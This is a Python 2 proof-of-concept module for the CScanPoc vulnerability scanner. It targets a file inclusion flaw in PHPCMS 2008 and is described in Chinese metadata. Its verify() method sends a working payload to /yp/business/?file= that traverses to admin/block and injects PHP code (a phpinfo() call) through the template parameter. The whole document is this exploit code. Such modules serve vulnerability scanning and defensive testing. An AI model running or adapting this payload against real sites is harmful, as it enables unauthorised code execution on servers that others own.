# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0024_L' # 平台漏洞编号，留空
    name = 'PHPCMS 2008 文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-07-25'  # 漏洞公布时间
    desc = '''
        这段代码写了我们注册的时候要注册的是企业会员，有的网站可以注册免费会员然后可以直接免费升级到企业会员的这也是可以利用的。
        我们进行一个企业会员的注册 ，然后进行登陆。
        登录以后 在 /yp/business/?file= 下存在文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/198/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS 2008'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'c6be279f-aaea-42b4-8cbe-94a6f99ea3c5'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #注册企业用户，登陆后验证
            s = requests.session()
            s.get(self.target)
            o = urlparse.urlparse(self.target)
            payload = "/yp/business/?file=../../admin/block&action=post&blockid=eval&template=<?php phpinfo();exit();?>"
            url = self.target + payload
            r = s.get(url)

            if r.status_code == 200 and  'system' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
